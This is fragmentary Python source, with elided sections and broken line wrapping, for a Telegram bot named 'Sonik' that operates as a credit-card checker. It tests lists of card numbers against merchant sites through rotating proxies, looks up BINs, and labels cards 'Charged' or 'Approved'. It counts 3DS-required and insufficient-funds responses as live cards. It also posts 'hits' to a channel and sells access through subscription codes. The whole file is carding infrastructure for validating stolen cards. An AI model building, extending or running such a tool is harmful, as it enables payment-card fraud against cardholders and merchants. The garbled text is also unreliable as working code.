...
import FloodWaitError

from telethon 
import TelegramClient, events, Button

from telethon.tl.types 
import MessageEntityCustomEmoji, ChannelParticipantBanned

from telethon.tl.functions.channels 
import GetParticipantRequest

from telethon.extensions 
...
REJECTED_GATEWAYS = [
    'authorize.net', 'authorize', 'checkout.com', 'checkout',
    'Checkout.com - Onsite Payments', 'stripe', 'stripe card payments',
    'Stripe Card Payments', 'braintree', 'square', 'adyen', 'payoneer', 'paypal'
]
ACCEPTED_RESPONSES = [
    '3ds_required',
    'insufficient_funds',
...
if self.error_count > self.success_count * 0.5:
            ...
            el
if self.success_count > self.error_count * 2 and self.current_delay > self.min_delay:
...
return False
GLOBAL_THROTTLER = AdaptiveThrottler(min_delay=0.01, max_delay=0.4)
...
return session
SESSION_POOL = SessionPool(pool_size=30)
...
with aiohttp.ClientSession() as session:
                async 
with session.get("https://api.telegram.org", timeout=5) as resp:
...
CE = {
    ...
    'telegram_logo': 5413813953685923984
}
...
return "".join(_BOLD_SANS_MAP.get(c, c) 
for c in str(text))
async 
def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
...
return session
async 
def cleanup_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
...
async 
def create_subscription_code(admin_id, hours):
    code = generate_code()
...
return None
        ...
        available = [s 
for s in sites 
if s not in exclude and self._site_fails.get(s, 0) < 5]
...
return None
        ...
        available = [p 
for p in proxies 
if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 5]
        
if not available:
            available = [p 
for p in proxies 
if p.get('proxy_url') not in exclude]
...
SITE_ERROR_KEYWORDS = [
    ...
    'tax amount empty', 'del ammount empty', 'site not supported 
for now',
...
return any(kw in lower 
for kw in SITE_ERROR_KEYWORDS) or lower == 'na'
...
return any(kw in text.lower().strip() 
for kw in PROXY_ERROR_KEYWORDS)
...
return url
async 
def detect_payment_gateway(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
    
try:
        url = build_api_url(site 
if site.startswith('http') else f'https://{site}', test_card, proxy_data)
        s = http_session or (await get_user_http_session(0, "site"))
        async 
with s.get(url, timeout=30) as resp:
...
return 'error'
async 
def get_site_product_price(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
...
return None
async 
def verify_site_full(site, proxy_data=None, http_session=None, max_retries=1):
...
if any(rj.lower() in gw_lower 
for rj in REJECTED_GATEWAYS):
...
return html_text, []
async 
def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
...
return None
async 
def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
...
return None
async 
def styled_edit(event, html_text, buttons=None, emoji_ids=None):
...
try:
        async 
with aiofiles.open(MAINTENANCE_FILE, "w") as f:
...
return False
        async 
with aiofiles.open(MAINTENANCE_FILE, "r") as f:
...
return True, f"{sub['plan'] 
if sub['is_active'] else 'Admin'}_private"
    
return False, "no_subscription"
async 
def require_subscription(event):
    uid = event.sender_id
...
return False
async 
def send_no_subscription_message(event):
...
return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' 
if u and pw else f'{pt}://{h}:{p}'
    
return {'ip': h, 'port': p, 'username': u or None, '
password': pw or None, 'proxy_url': pu, 'type': pt}
async 
...
try:
        ...
        async 
with s.get('http://api.ipify.org?format=json', proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
...
return False, None
async 
def test_proxies_batch(proxies_list):
...
return await test_proxy(p['proxy_url'])
    results = await asyncio.gather(*[test_one(p) 
for p in proxies_list], return_
exceptions=True)
...
with _BIN_SEM:
            async 
with s.get(f'https://bins.antipublic.cc/bins/{bin_prefix}') as r:
...
if proxy_data:
        ...
        un, pw = proxy_data.get('username'), proxy_data.get('
password')
        ps = f"{ip}:{port}:{un}:{pw}" 
if un and pw else f"{ip}:{port}"
...
return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
async 
def _check_card_api_internal(card, site, proxy_data=None, http_session=None):
    uid = "?"
    url = build_api_url(site 
if site.startswith('http') else f'https://{site}', card, proxy_data)
...
return result
async 
def check_card_api(card, site, proxy_data=None, user_id=None, http_session=None):
    
return await safe_api_call(_check_card_api_internal, card, site, proxy_data, http_session)
async 
def check_card_with_retry(card, sites, user_id=None, proxies_data=None, max_retries=3, rotator=None, cancel_check=None, http_session=None):
...
if rotator:
            ...
            available = [s 
for s in sites 
if s not in tried_sites] or list(sites)
...
if p.get('proxy_url') not in tried_proxies] or list(proxies_data)
...
try:
            ...
            log_user(user_id or "?", "FLOOD", f"Waiting {wait_time}s 
for card {card[:6]}***", "warning")
            await asyncio.sleep(wait_time)
...
async 
def test_site(site, proxy_data=None, http_session=None):
    test_card = "5154623245618097|03|2032|156"
...
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    ...
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "flag": "🏳️"}
    ps = f"${str(price).replace('$', '')}" 
if price and price != "-" else "-"
...
𝗗𝗲𝘃 → sonik""", he
async 
def send_channel_hit(res, uid, username, name):
    
try:
        sv = str(res.get("Status", "Charged")).upper()
        
if sv in ["CHARGED", "APPROVED"]:
            prof = f"https://t.me/{username}" 
if username and not username.startswith("user_") else f"tg://user?id={uid}"
...
if sender.username else "No Username"
...
return await styled_reply(event, t, emoji_ids=e)
        ...
        access_type = "OWNER" 
if uid in ADMIN_ID else (sub["plan"].upper() 
if sub["is_active"] else "TRIAL")
        credits = "Unlimited" 
if uid in ADMIN_ID else "250"
        joined_date = user.get("created_at", datetime.now()).strftime("%Y-%m-%d") 
if user else datetime.now().strftime("%Y-%m-%d")
...
pass
        await styled_send(event.chat_id, f"⚡ <b>{bs('Welcome to Sonik')}</b> ⚡\n📝 <code>/start</code> <b>{bs('
for commands')}</b>", emoji_ids=[CE["fire"], CE["fire"], CE["info"]])
...
⏳ <i>{bs('Generates a code 
for 24 hours subscription')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
...
<b>━━━━━━━━━━━━━━━━━</b>
💡 <i>{bs('Enter the code you received 
from admin')}</i>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"]])
...
💡 <i>{bs('Please contact admin 
for a new code')}</i>""", emoji_ids=[CE["cross"], CE["cross"], CE["warn"], CE["info"]])
...
⏳ <i>{bs('Wait 
for your subscription to expire')}</i>""", emoji_ids=[CE["warn"], CE["warn"], CE["info"]])
...
for code_data in codes[:20]:
            ...
            used = "✅" 
if code_data.get('used', False) else "⬜"
...
try:
                    async 
with aiofiles.open(fp, "r", encoding="utf-8", errors="ignore") as f:
...
📝 <i>3DS_REQUIRED | INSUFFICIENT_FUNDS | CARD_DECLINED | ORDER_PAID | CHARGED | PAYMENT_SUCCESSFUL</i>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["link"]])
        ...
        existing_norm = {normalize_site_url(s) 
...
<b>━━━━━━━━━━━━━━━━━</b>
✅ <i>{bs('Only working sites 
with accepted responses')}</i>
💰 <i>{bs('Sites 
with price above range will be excluded')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"], CE["info"]])
...
async 
def _process_add_sites_with_filter(event, new_sites, already_exists, price_range):
    uid = event.sender_id
    total = len(new_sites)
    tested = 0
    working = 0
    ...
    async 
def test_and_add(site):
        nonlocal tested, working, dead, added, price_filtered, rejected_gateway
        async 
with user_site_sem:
            
try:
                res = await verify_site_full(site, random.choice(proxies) 
if proxies else None, http_session=http_session)
                tested += 1
...
for i in range(0, len(new_sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(test_and_add(s)) 
for s in new_sites[i:i+SITE_PER_USER_WORKERS]], return_
exceptions=True)
...
<b>━━━━━━━━━━━━━━━━━</b>
✅ <i>{bs('Only working sites 
with accepted responses are added')}</i>""", emoji_ids=[CE["check"], CE["check"], CE["globe"], CE["fire"], CE["cross"], CE["chart"], CE["warn"], CE["info"]])
    await cleanup_user_http_session(uid, "site")
    cleanup_user_sem(uid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rm\b'))
async 
def remove_site(event):
...
async 
def check_sites_with_filter_cmd(event):
...
return await styled_reply(event, f"📋 <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
    ...
    await styled_reply(event, f"""🔍 <b>{bs('Site Check 
with Filter')}</b> 🔍
<b>━━━━━━━━━━━━━━━━━</b>
...
✅ <i>{bs('Only sites 
with accepted responses are kept')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["info"]])

@client.on(events.CallbackQuery(pattern=rb"site_price_range:(\d+):(\d+)"))
async 
def site_price_range_cb(event):
    range_id = int(event.pattern_match.group(1).decode())
    admin_id = int(event.pattern_match.group(2).decode())
...
async 
def _process_site_check_with_filter(event, price_range):
    uid = event.sender_id
    sites = await get_global_sites()
    total = len(sites)
    tested = 0
...
for i in range(0, len(sites), SITE_PER_USER_WORKERS):
        await asyncio.gather(*[asyncio.create_task(check_worker(s)) 
for s in sites[i:i+SITE_PER_USER_WORKERS]], return_
exceptions=True)
    removed_count = 0
...
try:
                    async 
with aiofiles.open(fp, "r", encoding="utf-8") as f:
                        lines = [l.strip() 
...
return await styled_reply(event, f"📝 <code>/addpxy ip:port:user:
pass</code>", emoji_ids=[CE["info"]])
...
return await styled_reply(event, f"🚫 <b>{bs('Limit 1000/1000')}</b>", emoji_ids=[CE["cross"]])
        existing = {p['proxy_url'] 
for p in await get_all_user_proxies(event.sender_id)}
        parsed = []
...
if status in ["Charged", "Approved"]:
        ...
        msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], bi, elapsed, extra_field=("Price", result.get('Price', '-')) 
...
if sub["is_active"]:
        ...
        remaining_str = f"{int(remaining * 60)} min" 
if remaining < 1 else f"{remaining:.1f} h"
...
async 
def maint_toggle(event):
    
if event.sender_id not in ADMIN_ID:
        return
    a = event.raw_text.lower().split()[1]
    await set_maintenance_mode(a == "on")
    await styled_reply(event, f"🔧 <b>{bs('Maintenance')} {bs('On') 
if a == 'on' else bs('Off')}</b>", emoji_ids=[CE["stop"] 
if a == "on" else CE["check"]])
...
try:
        await styled_send(target_uid, f"🚫 <b>{bs('You have been blocked 
from using Sonik')}</b>\n💡 <i>{bs('Contact admin 
if you think this is a mistake')}</i>", emoji_ids=[CE["stop"], CE["info"]])
...
if datetime.now(timezone.utc) < sub_end:
                is_sub_active = True
        el
if u.get('subscription_plan') == 'unlimited':
            is_sub_active = True
        sub_status = "✅" 
...
if int(wait_event.data.split(b":")[1]) == event.sender_id:
                ...
                el
if wait_event.data == b"cancel_broadcast":
...
💡 {bs('Or reply to a message 
with /broadcast')}""", emoji_ids=[CE["info"]])
...
pass
    client.add_event_handler(cb, events.CallbackQuery)
async 
def broadcast_to_all_users(original_event, msg, media_msg):
    users = await get_all_users()
...
async 
def give_subscription_cmd(event):
...
if uid not in ADMIN_ID and len(cards) > MAX_CARDS_MASS:
        ...
        await styled_reply(event, f"⚠️ <b>{bs('Limited to')} {MAX_CARDS_MASS} {bs('cards 
for non-admin users')}</b>", emoji_ids=[CE["warn"]])
    el
if len(cards) > 10000 and uid in ADMIN_ID:
        cards = cards[:10000]
...
return await event.answer(f"⚠️ {bs('Already running')}!", alert=True)
    ...
    async 
def shopify_check(card, http_session):
...
async 
def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type, filter_type="both"):
    uid = event.sender_id
...
return proc.get("stopped", False) 
if isinstance(proc, dict) else False
    async 
def check_banned_async():
...
break
        batch_tasks = [asyncio.create_task(worker(c)) 
for c in cards[i:i+batch_size]]
        all_tasks.extend(batch_tasks)
        
if isinstance(proc, dict):
            proc["tasks"] = all_tasks
        await asyncio.gather(*batch_tasks, return_
exceptions=True)
...
break
    ...
    cleanup_user_sem(uid)
async 
def _send_mass_hit(card, result, status, uid, username, name):
...
pass
async 
def send_final_file(uid, charged, approved, declined, errors, total, hits=None, target_chat=None):
    hits = hits or []
...
try:
        async 
with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            await f.write(f"{'='*49}\nSONIK RESULTS\n{'='*49}\n\nCharged: {charged}\nApproved: {approved}\nDeclined: {declined}\nErrors: {errors}\nTotal: {total}\n")
...
async 
def menu_checker_handler(event):
...
async 
def menu_account_handler(event):
    await event.answer("⌛ Loading...")
    uid = event.sender_id
    sub = await get_user_subscription(uid)
    access = "OWNER" 
...
async 
def back_to_start_handler(event):
...
import GetStickerSetRequest
        
from telethon.tl.types 
import InputStickerSetShortName
...
if i < num_docs:
                    CE[key] = docs[i].id
            log_system("BOOT", f" ✅ Successfully loaded {min(num_docs, len(keys))} premium emojis 
from pack!")
...
try:
            ...
            log_system("BOOT", "✅ Price filtering 
from 0.01 USD")
            log_system("BOOT", "✅ 3ds_required classified as Approved")
            log_system("BOOT", "✅ Code system enabled: /code and /redeem")
            log_system("BOOT", "✅ Proxy required 
for /sp and /msp")
            log_system("BOOT", "✅ Adaptive protection 
with Circuit Breaker and Session Pool")
